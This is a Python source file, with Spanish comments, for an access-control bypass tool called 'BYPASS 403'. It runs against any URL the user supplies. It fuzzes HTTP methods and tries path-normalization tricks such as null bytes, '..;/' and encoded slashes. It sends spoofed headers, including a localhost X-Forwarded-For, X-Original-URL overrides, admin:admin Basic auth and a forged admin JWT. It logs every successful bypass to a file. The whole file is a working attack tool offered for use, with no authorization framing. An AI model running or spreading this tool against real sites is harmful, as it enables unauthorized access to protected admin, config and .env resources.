#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
BYPASS 403 v3.0 - TANQUE EDITION
80+ técnicas · Method fuzzing · Header injection · Path normalization
Auto-detección de bypass funcionales
"""

import asyncio
import random
import sys
from urllib.parse import urlparse, urljoin
from typing import Dict, List, Optional

try:
    from http_client import HTTPClient
except ImportError:
    class HTTPClient:
        async def __aenter__(self): return self
        async def __aexit__(self, *args): pass
        async def get(self, url): return None

class Bypass403:
    def __init__(self, url: str, paths: List[str] = None, aggressive: bool = False):
        self.url = url.rstrip('/')
        self.parsed = urlparse(url)
        self.base = f"{self.parsed.scheme}://{self.parsed.netloc}"
        self.path = self.parsed.path or '/'
        self.aggressive = aggressive
        self.client = None
        self.findings = []
        
        # Paths a probar
        if paths:
            self.paths = paths
        elif self.path != '/':
            self.paths = [self.path.lstrip('/')]
        else:
            self.paths = ['admin', 'api', 'config', '.env', 'backup']
            
        # ============================================================
        # TÉCNICAS DE BYPASS (80+)
        # ============================================================
        
        # 1. Method fuzzing (todos los HTTP methods)
        self.methods = [
            'GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD',
            'OPTIONS', 'TRACE', 'CONNECT', 'PROPFIND', 'PROPPATCH',
            'MKCOL', 'COPY', 'MOVE', 'LOCK', 'UNLOCK', 'VERSION_CONTROL',
            'CHECKOUT', 'UNCHECKOUT', 'CHECKIN', 'UPDATE', 'LABEL',
            'MERGE', 'BASELINE_CONTROL', 'MKWORKSPACE', 'REPORT'
        ]
        
        # 2. Path normalization
        self.path_techniques = [
            ('/{path}', 'normal'),
            ('/{path}/', 'trailing_slash'),
            ('/{path}.', 'dot_suffix'),
            ('/{path}..;/', 'dot_dot_slash'),
            ('/{path}/./', 'current_dir'),
            ('/{path}/../{path}/', 'self_traversal'),
            ('/{path}%20', 'space_suffix'),
            ('/%2f{path}', 'encoded_slash'),
            ('/{path}%2f', 'encoded_slash_suffix'),
            ('/{path}%00', 'null_byte'),
            ('/{path}%0a', 'newline'),
            ('/{path}%0d', 'carriage'),
            ('/{path}%09', 'tab'),
            ('/{path}*', 'wildcard'),
            ('/{path}.json', 'json_ext'),
            ('/{path}.xml', 'xml_ext'),
            ('/{path}.php', 'php_ext'),
            ('/{path}.asp', 'asp_ext'),
            ('/{path}.jsp', 'jsp_ext'),
            ('/.;/{path}', 'dot_semicolon'),
            ('/..;/..;/..;{path}', 'deep_traversal'),
            ('/{path}/..;/', 'traversal_slash'),
            ('/....//{path}', 'double_dot'),
            ('/{path}//', 'double_slash'),
            ('//{path}//', 'double_both'),
            ('/;/{path}', 'semicolon_prefix'),
        ]
        
        # 3. Header-based bypass
        self.header_techniques = [
            # IP Spoofing
            ({"X-Forwarded-For": "127.0.0.1"}, "localhost_ip"),
            ({"X-Forwarded-For": "localhost"}, "localhost_host"),
            ({"X-Forwarded-For": "2130706433"}, "decimal_ip"),
            ({"X-Real-IP": "127.0.0.1"}, "real_ip"),
            ({"X-Originating-IP": "127.0.0.1"}, "originating_ip"),
            ({"X-Remote-IP": "127.0.0.1"}, "remote_ip"),
            ({"X-Remote-Addr": "127.0.0.1"}, "remote_addr"),
            ({"X-Client-IP": "127.0.0.1"}, "client_ip"),
            ({"CF-Connecting-IP": "127.0.0.1"}, "cloudflare_ip"),
            ({"True-Client-IP": "127.0.0.1"}, "true_client"),
            
            # Method override
            ({"X-HTTP-Method-Override": "GET"}, "method_override"),
            ({"X-HTTP-Method": "GET"}, "method_alt"),
            ({"X-Method-Override": "GET"}, "method_override2"),
            
            # URL override
            ({"X-Original-URL": f"/{self.paths[0]}"}, "original_url"),
            ({"X-Rewrite-URL": f"/{self.paths[0]}"}, "rewrite_url"),
            ({"X-Original-URI": f"/{self.paths[0]}"}, "original_uri"),
            
            # Protocol spoofing
            ({"X-Forwarded-Proto": "http"}, "http_proto"),
            ({"X-Forwarded-Proto": "https"}, "https_proto"),
            ({"X-Forwarded-Scheme": "http"}, "http_scheme"),
            ({"X-Forwarded-Scheme": "https"}, "https_scheme"),
            ({"X-Forwarded-Port": "80"}, "port_80"),
            ({"X-Forwarded-Port": "443"}, "port_443"),
            ({"X-Forwarded-Host": "localhost"}, "host_local"),
            ({"X-Forwarded-Host": self.parsed.netloc}, "host_original"),
            
            # Auth bypass
            ({"Authorization": "Basic YWRtaW46YWRtaW4="}, "basic_auth"),
            ({"Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJhZG1pbiI6dHJ1ZX0"}, "jwt_admin"),
            
            # Cache bypass
            ({"Pragma": "no-cache"}, "no_cache"),
            ({"Cache-Control": "no-cache"}, "cache_control"),
            
            # Range requests
            ({"Range": "bytes=0-1024"}, "range"),
            ({"Range": "bytes=0-1"}, "range_small"),
            
            # Referer spoofing
            ({"Referer": self.base}, "referer_self"),
            ({"Referer": f"{self.base}/admin"}, "referer_admin"),
            ({"Referer": "https://www.google.com"}, "referer_google"),
            
            # User-Agent rotation
            ({"User-Agent": "Googlebot/2.1 (+http://www.google.com/bot.html)"}, "googlebot"),
            ({"User-Agent": "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"}, "bingbot"),
            ({"User-Agent": "Twitterbot/1.0"}, "twitterbot"),
            ({"User-Agent": "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"}, "facebookbot"),
            ({"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15"}, "iphone"),
            
            # Accept headers
            ({"Accept": "application/json"}, "accept_json"),
            ({"Accept": "application/xml"}, "accept_xml"),
            ({"Accept": "text/html"}, "accept_html"),
            ({"Accept": "*/*"}, "accept_all"),
            
            # Content-Type tricks
            ({"Content-Type": "application/x-www-form-urlencoded"}, "form_urlencoded"),
            ({"Content-Type": "multipart/form-data"}, "multipart"),
            ({"Content-Type": "application/json"}, "content_json"),
            
            # Encoding
            ({"Accept-Encoding": "gzip, deflate, br"}, "accept_encoding"),
            ({"Accept-Encoding": "identity"}, "identity"),
            
            # Language
            ({"Accept-Language": "en-US,en;q=0.9"}, "accept_en"),
            ({"Accept-Language": "es-ES,es;q=0.9"}, "accept_es"),
        ]
        
        # 4. Protocol tricks
        self.protocol_techniques = [
            ('http://', 'http'),
            ('https://', 'https'),
            ('http://{path}', 'http_path'),
            ('https://{path}', 'https_path'),
            ('//{path}', 'protocol_relative'),
        ]
        
        # 5. Case manipulation
        self.case_techniques = [
            ('/{path}'.upper(), 'uppercase'),
            ('/{path}'.lower(), 'lowercase'),
            ('/{path}'.title(), 'titlecase'),
            ('/{path}'.swapcase(), 'swapcase'),
        ]
        
        # Combinaciones totales
        self.total_tests = (
            len(self.methods) * len(self.path_techniques) +
            len(self.header_techniques) * len(self.paths) +
            len(self.protocol_techniques) +
            len(self.case_techniques)
        ) * len(self.paths)
        
    async def setup(self):
        """Inicializa cliente HTTP"""
        self.client = HTTPClient(timeout=10, max_retries=2)
        
    async def get_baseline(self, path: str) -> Dict:
        """Obtiene respuesta baseline para comparar"""
        url = f"{self.base}/{path}"
        try:
            resp = await self.client.get(url)
            if resp:
                text = await resp.text()
                return {
                    'status': resp.status,
                    'length': len(text),
                    'content': text[:200]
                }
        except:
            pass
        return {'status': 403, 'length': 0, 'content': ''}
        
    async def test_bypass(self, path: str, method: str = 'GET', headers: Dict = None, 
                          url_mod: str = None, technique: str = '') -> Optional[Dict]:
        """Prueba una técnica de bypass"""
        try:
            if url_mod:
                url = url_mod
            else:
                url = f"{self.base}/{path.lstrip('/')}"
                
            # Pequeño delay aleatorio
            await asyncio.sleep(random.uniform(0.1, 0.3))
            
            # Realizar petición
            if method == 'HEAD':
                resp = await self.client.head(url, headers=headers)
            else:
                resp = await self.client.request(method, url, headers=headers)
                
            if not resp:
                return None
                
            # Leer contenido si no es HEAD
            text = ''
            if method != 'HEAD':
                text = await resp.text()
                
            # Verificar si es un bypass real
            if resp.status not in [401, 403, 404]:
                return {
                    'url': url,
                    'method': method,
                    'status': resp.status,
                    'length': len(text),
                    'technique': technique,
                    'headers': headers,
                    'evidence': text[:200] if resp.status == 200 else ''
                }
                
        except Exception as e:
            pass
        return None
        
    async def scan(self):
        """Ejecuta escaneo completo de bypass"""
        print(f"\n🔓 BYPASS 403 v3.0 TANQUE - {self.base}")
        print("=" * 70)
        print(f"[*] Paths a probar: {len(self.paths)}")
        print(f"[*] Técnicas totales: {self.total_tests}")
        print("-" * 70)
        
        await self.setup()
        
        try:
            for path in self.paths:
                print(f"\n[*] Probando path: /{path}")
                
                # Baseline
                baseline = await self.get_baseline(path)
                print(f"    Baseline: {baseline['status']}")
                
                # 1. Method fuzzing + path techniques
                for method in self.methods[:10]:  # Limitar métodos
                    for path_tech, tech_name in self.path_techniques[:20]:  # Limitar técnicas
                        test_path = path_tech.replace('{path}', path)
                        test_url = f"{self.base}{test_path}"
                        
                        result = await self.test_bypass(
                            path, 
                            method=method,
                            url_mod=test_url,
                            technique=f"{method}+{tech_name}"
                        )
                        
                        if result:
                            self.findings.append(result)
                            print(f"   [[CRITICO]] {result['status']} - {method} {test_path}")
                            if result['status'] == 200:
                                print(f"        ↳ Evidencia: {result['evidence'][:100]}...")
                                
                # 2. Header techniques
                for headers, tech_name in self.header_techniques:
                    result = await self.test_bypass(
                        path,
                        headers=headers,
                        technique=f"header:{tech_name}"
                    )
                    
                    if result:
                        self.findings.append(result)
                        print(f"   [[WARN]] {result['status']} - {tech_name}")
                        
                # 3. Protocol tricks (aggressive mode)
                if self.aggressive:
                    for proto_url, tech_name in self.protocol_techniques:
                        test_url = proto_url.replace('{path}', f"{self.base}/{path}")
                        result = await self.test_bypass(
                            path,
                            url_mod=test_url,
                            technique=f"proto:{tech_name}"
                        )
                        
                        if result:
                            self.findings.append(result)
                            print(f"   [[INFO]] {result['status']} - {tech_name}")
                            
            # Mostrar resumen
            print("\n" + "="*70)
            print("📊 BYPASSES ENCONTRADOS")
            print("="*70)
            
            if self.findings:
                # Agrupar por código de estado
                by_status = {}
                for f in self.findings:
                    status = f['status']
                    if status not in by_status:
                        by_status[status] = []
                    by_status[status].append(f)
                    
                # Mostrar 200 primero
                if 200 in by_status:
                    print(f"\n[OK] ACCESO COMPLETO (200): {len(by_status[200])}")
                    for f in by_status[200][:10]:
                        print(f"   • {f['technique']}")
                        print(f"     ↳ {f['url']}")
                        
                # Luego otros códigos
                for status in sorted(by_status.keys()):
                    if status == 200:
                        continue
                    print(f"\n[INFO] CÓDIGO {status}: {len(by_status[status])}")
                    for f in by_status[status][:5]:
                        print(f"   • {f['technique']}")
                        
                print(f"\n[OK] TOTAL BYPASSES: {len(self.findings)}")
                
                # Guardar resultados
                with open(f"bypass_{self.parsed.netloc}.txt", 'w') as f:
                    for finding in self.findings:
                        f.write(f"{finding['url']} [{finding['status']}] - {finding['technique']}\n")
                print(f"\n💾 Resultados guardados en bypass_{self.parsed.netloc}.txt")
                
            else:
                print("\n❌ No se encontraron bypasses")
                
        finally:
            if self.client:
                await self.client.close()
                
        return self.findings

async def main():
    if len(sys.argv) < 2:
        print("Uso: python3 bypass_403.py <URL> [paths...] [--aggressive]")
        print("Ejemplo: python3 bypass_403.py https://ejemplo.com/admin")
        print("         python3 bypass_403.py https://ejemplo.com/api/v1 --aggressive")
        sys.exit(1)
        
    url = sys.argv[1]
    aggressive = '--aggressive' in sys.argv
    
    # Extraer paths
    paths = []
    for arg in sys.argv[2:]:
        if not arg.startswith('--'):
            paths.append(arg)
            
    bypass = Bypass403(url, paths if paths else None, aggressive)
    await bypass.scan()

if __name__ == "__main__":
    asyncio.run(main())
